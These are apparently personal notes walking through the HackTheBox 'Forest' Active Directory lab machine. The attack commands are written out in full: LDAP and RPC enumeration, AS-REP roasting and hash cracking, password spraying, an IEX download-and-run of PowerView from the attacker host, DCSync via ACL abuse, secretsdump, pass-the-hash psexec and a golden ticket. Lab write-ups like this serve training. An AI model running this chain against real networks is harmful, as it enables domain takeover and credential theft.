#Enumeration #nmap
`nmap -sC -sV -oA nmap/forest 10.10.10.161`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

`nmap -p- -oA nmap/forest-allports 10.10.10.161`
`-p- for all prots`

Scan results 
![[Pasted image 20241210203914.png]]


#SMB Enumeration 
Enumerate port 445 with #smbclient 

`smbclient -L 10.10.10.161` (deadend)
- anonymous login successful
- no shares

#DNS Enumeration 
Enumerate port 53 with #nslookup 
`>nslookup
`server 10.10.10.161`
reverse lookups:
`>127.0.0.1`
![[Pasted image 20241210203407.png]]
*TIP: Determine OS is Windows based on ttl=127 from a ping sweep. Determine OS is Linux based on ttl=64. If above >128 it's probably network infrastructure like a router. 
![[Pasted image 20241210203538.png]]
- Could not leak host name 

#LDAP Enumeration

`ldapsearch -h 10.10.10.161 -x` 
`-x for simple authentication`
![[Pasted image 20241210205507.png]]
`ldapsearch -h 10.10.10.161 -x -s bade namingcontexts`
![[Pasted image 20241210205639.png]]
Found domain name and can seed new search. 

`ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local`

Query for Person

`ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local '(objectClass=Person)'`
![[Pasted image 20241210210231.png]]
Query for User
`ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local '(objectClass=User)' sAMAccountName | grep sAMAccountName`

Create a wordlist of users

`ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap`

Deleted the following users:
- requesting, guest, usernames beginning with $, usernames beginning with SM and HealthMailBox
Final list of users:
![[Pasted image 20241211183751.png]]
Creating a wordlist for password cracking
![[Pasted image 20241211184007.png]]
Adding years to passwords
`for i in $(cat pwlist.txt); do echo $i; echo $(i)2019; echo $(i)2020; done > t`
`mv t pwlist.txt`
Password list generation with #hashcat 
`hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule`
Also add exclamation point
`for i in $(cat pwlist.txt); do echo $i; echo $(i)\!; done > t
Chain wordlists using #hashcat 
`hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule`

Using CrackMapExec to dump the password policy of Active Directory using a null authentication, then doing a Password Spray

`crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''`
![[Pasted image 20241211185533.png]]
Viewing password policy to check that "Account lockout threshold: 0" which means we can brute force 

Enumerating information out of AD using rpcclient and null authentication

`rpcclient -U '' 10.10.10.161`
![[Pasted image 20241211185940.png]]

`>enumdomusers`
![[Pasted image 20241211190109.png]]
Discovered new user this way: `svc-alfresco`
`>queryusergroups <rid # of user>`
![[Pasted image 20241211190417.png]]
`>querygroup 0x201`
![[Pasted image 20241211190551.png]]
Domain user
![[Pasted image 20241211190634.png]]
Service account

Password spraying using #crackmapexec

`crackmapexec smb 10.10.10.161 -u userlist.out -p pwlist.txt `

Look at #impacket scripts to try

`locate impacket | grep example`

`cd /usr/share/doc/python3-impacket/examples/`

![[Pasted image 20241211202905.png]]

Trying out `GetNPUsers.py` for users that don't require Kerberos pre-authentication.

`./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'`

![[Pasted image 20241211203411.png]]

`./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat`

Let's crack this hash using #hashcat 

Check what hashing technique is used using hashcat.

`./hashcat --example-hashes | grep -i krb`

![[Pasted image 20241211203918.png]]
`./hashcat --example-hashes | less 

hashcat mode found: 18200 

Crackin'

`./hashcat -m 18200 hashes/svc-alfresco /opt/wordlist/rockyou.txt -r rules/InsidePro-PasswordPro.rule`

Hash cracked. 

![[Pasted image 20241211204501.png]]

Password: s3rvice

Trying to get a shell using crackmapexec (failed)

`crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares`

![[Pasted image 20241211204817.png]]
Could potentially extract SYSVOL password 

From all ports scan in nmap - notice port 5985 is open (WINRM)

![[Pasted image 20241211205310.png]]
Use #evilwinrm to get a shell on the box using alfresco's creds

`./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161`

![[Pasted image 20241211205559.png]]
Setting up a SMBShare, using New-PSDRive to mount the share, then running WinPEAS

Serve winpeas to remote machine using SMB. 

Start smbserver
`impacket-smbserver NameofShare $(pwd) -smb2support -user rachel -password penny`

![[Pasted image 20241211210109.png]]
Adding password as argument on remote machine
`$pass = convertto-securestring 'penny' -AsPlainText -Force`
![[Pasted image 20241211210336.png]]
`$cred= New-Object System.Management.Automation.PSCredential('rachel', $pass)`

`New-PSDrive -Name rachel -PSProvider FileSystem -Credential $cred -Root \\10.10.14.2\NameofShare (ip of kali box)`
![[Pasted image 20241211210806.png]]
Execute #winpeas
![[Pasted image 20241211210938.png]]
Pull latest version of #bloodhound 
Pre-compiled exes within the repo 
`find . |grep exe`
![[Pasted image 20241211211619.png]]
Copy SharpHound.exe to smb share directory
![[Pasted image 20241211212128.png]]

Run SharpHound

`.\SharpHound.exe -c all`

Before starting Bloodhound.. need to start #neo4j 

`neo4j console`

Execute Bloodhound

`./Bloodhound --no-sandbox`

Use neo4j creds to login

Take bloodhound.zip and drop into bloodhound window

Can run query `Shortest Paths to Kerberoastable Users` (dead end)

Run `Shortest Path from Owned Principals` and discover exchange server

![[Pasted image 20241212181507.png]]
Run nslookup on exchange server:
`nslookup
`>server 10.10.10.161`
`>exch01.htb.local`

![[Pasted image 20241212181730.png]]
Discover different domain `10.10.10.7` however..unreachable by ping.

Looking up `windows account operators group` to determine which groups we cannot add people to.. but if it's not one of those groups we can add a user.

![[Pasted image 20241212182149.png]]

Adding a user to the Exchange Windows Permissions group. 

From initial access shell:

`net user rachel Penny1! /add /domain`

Add this new user to the Exchange Windows Permissions group

`net group "Exchange Windows Permissions" /add rachello`

![[Pasted image 20241212182612.png]]

New user has permissions to modify the DACL on the domain htb.local. IE we can grant ourselves any privilege we want on the object. 

![[Pasted image 20241212182818.png]]
Grab #powerview from GitHub

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Serve up PowerView using #pythonhttpserver

`python3 -m http.server 80`

![[Pasted image 20241212183613.png]]

Download onto remote host 

`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/PowerView.ps1')`

![[Pasted image 20241212183809.png]]

Enter password for user we just created

`$pass = convertto-securestring 'Penny1!' -AsPlainText -Force`

`$cred= New-Object System.Management.Automation.PSCredential('rachello', $pass)`

Then run recommended command from Bloodhound for adding domain object acl

`Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync`


![[Pasted image 20241212184231.png]]
Ran into issue with powersploit version
![[Pasted image 20241212184408.png]]
Solution: grabbing powersploit from the `dev` branch instead

![[Pasted image 20241212184542.png]]
Tool to dump everything #secretsdump.py

`secretsdump.py` is part of #impacket 

On kali box run:

`./secretsdump.py htb.local/rachello:Penny1!@10.10.10.161`



Bloodhound command was wrong so modifying it to

`Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rachello -Rights DCSync`

Re-running `secretsdump.py` and got an administrator password hash

![[Pasted image 20241212185605.png]]

Running #crackmapexec using admin's hash

`crackmapexec smb 10.10.10.161 -u administrator -H xfcghggaghdhlakjld`

![[Pasted image 20241212185851.png]]

Use `psexec.py` to gain access

`psexec.py -hashes <LM:NTLM> administrator@10.10.10.161`

It doesn't matter what you put for the LM

![[Pasted image 20241212190219.png]]

Now logged in as administrator.

Bonus:

Cracking #ntlmhashes with #hashcat 

`./hashcat --user -m 1000 hashes.ntlm /opt/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule`

Hash file is in the form user:hash

Doing #goldenticket attack from Linux using krbtgt hash
![[Pasted image 20241212201936.png]]


Cheatsheet:
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

![[Pasted image 20241212201852.png]]

Query for domain-sid

`Get-ADDomain htb.local`

![[Pasted image 20241212202205.png]]

Create the ticket with

`python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>`

![[Pasted image 20241212202747.png]]

Set the ticket for impacket use
`export KRB5CCNAME=<TGS_ccache_file>`

![[Pasted image 20241212202937.png]]

Run psexec

`./psexec.py htb.local/TotallyDoesNotExist@10.10.10.161 -k -no-pass`

ensure `10.10.10.161 htb.local` is in `/etc/hosts`

Error because clock skew is too great

![[Pasted image 20241212203305.png]]

Check target machine time with nmap scan

![[Pasted image 20241212203357.png]]

Issues resolved:

![[Pasted image 20241212204627.png]]


-----
### My attempt with PowerView and what not didn't work.

Tested with 

#### impacket-ntlmrelayx

[Ref Blog](https://medium.com/@Poiint/htb-forest-write-up-800ae3ab8ace)
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250602215805.png]]

#### impacket-secretsdump

```
impacket-secretsdump htb.local/rachello:'Penny1!'@htb.local
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250602215953.png]]

#### impacket-psexec

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250602220456.png]]